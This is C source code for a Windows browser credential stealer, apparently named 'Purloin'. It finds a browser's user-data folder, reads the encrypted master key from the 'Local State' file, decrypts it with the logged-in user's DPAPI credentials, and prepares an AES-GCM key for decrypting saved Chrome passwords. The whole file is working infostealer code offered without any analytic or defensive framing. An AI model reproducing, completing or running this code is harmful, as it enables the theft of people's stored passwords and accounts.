#include "Purloin_Browser.h"
#include "Purloin_Debug.h"

BOOL get_browser_dir(GUID folder_id, PCWSTR browser_location, PWSTR buf_path, PSTR buf_outMsg, WORD buf_outSize) {
	PWSTR p_temp_userdata_location = NULL;															// Temporary pointer to hold returned user data (%LOCALAPPDATA%, %APPDATA%, etc.) folder path
	HRESULT hr;																						// Error handling 
	errno_t err;																					// Error handling 

	/* Get Local Appdata Directory of the user */
	if (FAILED(hr = SHGetKnownFolderPath(folder_id, 0, NULL, &p_temp_userdata_location))) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_browser_dir: SHGetKnownFolderPath: Getting Local Appdata Directory error code: %d\n", hr);)
		CoTaskMemFree(p_temp_userdata_location);
		return FALSE;
	}

	/* Copy %LOCALAPPDATA% location to permenant buffer */
	if ((err = wmemcpy_s(buf_path, MAX_PATH, p_temp_userdata_location, lstrlenW(p_temp_userdata_location))) != 0) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_browser_dir: wmemcpy_s: Copying %%LOCALAPPDATA%% to buffer error code: %d\n", err);)
		return FALSE;
	}

	/* Copy relative path of Chrome directory from %LOCALAPPDATA% to permenant buffer */
	if ((err = wmemcpy_s(buf_path + lstrlenW(p_temp_userdata_location), MAX_PATH, browser_location, lstrlenW(browser_location)+1)) != 0) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_browser_dir: wmemcpy_s: Copying Chrome Userdata folder to buffer error code: %d\n", err);)
		return FALSE;
	}

	/* Check if that Chrome path exitsts */
	if (!PathFileExistsW(buf_path)) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_browser_dir: PathFileExistsW: No folder found.\n");)
		return FALSE;
	}

	/* Free the memory allocated by temporary buffer to hold the %LOCALAPPDATA% folder */
	CoTaskMemFree(p_temp_userdata_location);
	return TRUE;
}

BOOL get_encrypted_masterkey(PCWSTR browser_dir, PCWSTR data_file, PWCHAR enc_master_key, WORD enc_master_key_size, PSTR buf_outMsg, WORD buf_outSize) {
	FILE* fp_local_state_file = NULL;												// File pointer to 'Local State' file
	WCHAR local_state_location[MAX_PATH], buffer[2];								// First Buffer to hold path for 'Local State' file, and the second buffer to hold two wchars (including null-term). Buffer is used to read file
	BOOL quoteFound = FALSE, propertyFound = FALSE;
	errno_t err;
	int i = 0;

	/* Copy chrome path to temporary buffer */
	if ((err = wmemcpy_s(local_state_location, MAX_PATH, browser_dir, lstrlenW(browser_dir))) != 0) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_encrypted_masterkey: wmemcpy_s: Copying Chrome path to buffer error code: %d\n", err);)
		return FALSE;
	}

	/* Add '\Local State' to temporary buffer */
	if ((err = wmemcpy_s(local_state_location + lstrlenW(browser_dir), MAX_PATH, data_file, lstrlenW(data_file)+1 )) != 0) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_encrypted_masterkey: wmemcpy_s: Copying '%ws' file path to buffer error code: %d\n", data_file, err);)
		return FALSE;
	}

	/* Check if Local State file exists */
	if (!PathFileExistsW(local_state_location)) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_encrypted_masterkey: PathFileExistsW: No '%ws' file found.\n", data_file);)
		return FALSE;
	}

	/* Opens the 'Local State' file in UTF-8 mode */
	if ((err = _wfopen_s(&fp_local_state_file, local_state_location, L"r, ccs=UTF-8")) != 0) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_encrypted_masterkey: _wfopen_s: Opening '%ws' file error code: %d:%d\n", data_file, err, errno);)
	}
	if (fp_local_state_file == NULL) {
		_wcserror_s(enc_master_key, enc_master_key_size, err);
		return FALSE;
	}

	/* Read and get the encrypted key */
	while (fgetws(buffer, 2, fp_local_state_file)) {
		if (!wcscmp(buffer, L"\"")) {
			if (!quoteFound) {
				quoteFound = TRUE;
				continue;
			}
			else {
				quoteFound = FALSE;
				if (!wcscmp(enc_master_key, L"encrypted_key")) {
					wmemset(enc_master_key, L'\0', enc_master_key_size);
					i = 0;
					propertyFound = TRUE;
					continue;
				}
				if (propertyFound) {
					enc_master_key[i] = (WCHAR)L'\0';
					if ((err = fclose(fp_local_state_file)) != 0) {
						Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_encrypted_masterkey: fclose: '%ws' closing error code: %d\n", data_file, err);)
					}
					return TRUE;
				}
				enc_master_key[i] = L'\0';
				wmemset(enc_master_key, L'\0', enc_master_key_size);
				i = 0;
			}
		}
		else if (quoteFound) {
			enc_master_key[i] = buffer[0];
			i++;
		}
	}

	/* If encrypted key is not found */
	if ((err = fclose(fp_local_state_file)) != 0) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_encrypted_masterkey: fclose: Local File closing error code: %d\n", err);)
	}
	return FALSE;
}

BOOL decrypt_masterkey_and_ret(PWCHAR enc_master_key, PCHAR char_master_key, WORD enc_char_master_key_size, BCRYPT_KEY_HANDLE* p_handle_key, PSTR buf_outMsg, WORD buf_outSize) {
	size_t size_returned_char_master_key;												// To hold resulting bytes after converting WCHAR Base64 encoded encrypted master key to CHAR
	DWORD size_byte_master_key = NULL, bytesDone = 0;									// To hold size of byte form master key, to hold how many bytes used by Bcrypt 
	BCRYPT_ALG_HANDLE handle_bcrypt_algorithm;											// Handle to Bcrypt ALG algorithm provider
	DATA_BLOB blob_enc_masterkey, blob_dec_masterkey;									// DATA_BLOBs to hold byte form of encrypted and decrypted master keys
	errno_t err;
	NTSTATUS bcryptStatus = 0;

	/*
	Master key in the 'Local State' file is encoded in Base64, after decoding it into byte form, there will be 5 bytes of 'DPAPI' string to identify
	the encryption type of the Master key, DPAPI is the API provided by Windows to protect data (using CryptProtectData()). So 'DPAPI' is removed and then
	rest of the bytes are decrypted using CryptUnProtectData() funciton. And then
	*/
	/* Convert WCHAR form of Base64 encoded master key to CHAR */
	if ((err = wcstombs_s(&size_returned_char_master_key, char_master_key, enc_char_master_key_size * sizeof(CHAR), enc_master_key, (enc_char_master_key_size - 1) * sizeof(CHAR)))) {
		sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "wcstombs_s: Error when converting wchar master key to char master key, error: %d\n", err);
		return FALSE;
	}
	/* To Convert CHAR form of Base64 encoded master key to Byte form, the resulting buffer size is needed, so 'size_byte_master_key' is passed to get that value */
	if (!(CryptStringToBinaryA(char_master_key, 0, CRYPT_STRING_BASE64, NULL, &size_byte_master_key, NULL, NULL))) {
		sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "CryptStringToBinaryA: Error when getting size of the buffer to hold byte master key, error: %d\n", err);
		return FALSE;
	}
	/* Using above 'size_byte_master_key', a buffer is created to hold Byte form of Base64 encoded master key */
	BYTE* byte_master_key = (BYTE*)malloc(size_byte_master_key);
	if (!byte_master_key) {
		sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "malloc: Error when allocating memory for byte master key\n");
		return FALSE;
	}
	/* Convert Base64 encoded master key into byte form */
	if (!(CryptStringToBinaryA(char_master_key, 0, CRYPT_STRING_BASE64, byte_master_key, &size_byte_master_key, NULL, NULL))) {
		sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "CryptStringToBinaryA: Error when converting and placing byte master key, error: %d\n", err);
		return FALSE;
	}
	/* Move the bytes in 'byte_master_key' to left by 5 bytes. So the bytes of 'DPAPI' will be overwritten. */
	memmove(byte_master_key, byte_master_key + 5, size_byte_master_key);
	/* Then the resulting bytes will be placed on 'DATA_BLOB' structure to Decrypt it using CryptUnProtectData(), then it will be decrypted and decrypted and resulting data will be placed on 'blob_dec_masterkey'*/
	blob_enc_masterkey.cbData = size_byte_master_key - 5;
	blob_enc_masterkey.pbData = byte_master_key;
	if (!(CryptUnprotectData(&blob_enc_masterkey, NULL, NULL, NULL, NULL, 0, &blob_dec_masterkey))) {
		sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "CryptUnprotectData: Master key decryption failed.\n");
		return FALSE;
	}

	/*
	Chrome passwords are encrypted using AES-256-GCM encrypting algorithm (symetric). So Decrypting algorithm provider is opened and the returned resulting handle to actully
	decrypt passwords using that handle.
	*/
	bcryptStatus = BCryptOpenAlgorithmProvider(&handle_bcrypt_algorithm, BCRYPT_AES_ALGORITHM, 0, 0);
	if (!BCRYPT_SUCCESS(bcryptStatus)) {
		sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "BCryptOpenAlgorithmProvider: Error getting BCrypt handle, error: %ld\n", bcryptStatus);
		return FALSE;
	}
	bcryptStatus = BCryptSetProperty(handle_bcrypt_algorithm, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
	if (!BCRYPT_SUCCESS(bcryptStatus)) {
		sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "BCryptSetProperty: Error setting BCrypt handle, error: %ld\n", bcryptStatus);
		return FALSE;
	}
	BCRYPT_AUTH_TAG_LENGTHS_STRUCT authTagLengths;
	bcryptStatus = BCryptGetProperty(handle_bcrypt_algorithm, BCRYPT_AUTH_TAG_LENGTH, (BYTE*)&authTagLengths, sizeof(authTagLengths), &bytesDone, 0);
	if (!BCRYPT_SUCCESS(bcryptStatus)) {
		sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "BCryptGetProperty: Error getting BCrypt handle, BCRYPT_AUTH_TAG_LENGTH, error: %ld\n", bcryptStatus);
		return FALSE;
	}
	DWORD blockLength = 0;
	bcryptStatus = BCryptGetProperty(handle_bcrypt_algorithm, BCRYPT_BLOCK_LENGTH, (BYTE*)&blockLength, sizeof(blockLength), &bytesDone, 0);
	if (!BCRYPT_SUCCESS(bcryptStatus)) {
		sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "BCryptGetProperty: Error getting BCrypt handle, BCRYPT_BLOCK_LENGTH, error: %ld\n", bcryptStatus);
		return FALSE;
	}
	bcryptStatus = BCryptGenerateSymmetricKey(handle_bcrypt_algorithm, p_handle_key, 0, 0, blob_dec_masterkey.pbData, blob_dec_masterkey.cbData, 0);
	if (!BCRYPT_SUCCESS(bcryptStatus)) {
		sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "BCryptGenerateSymmetricKey: Error generating Symetric key, error: %ld\n", bcryptStatus);
		return FALSE;
	}

	free(byte_master_key);
	return TRUE;
}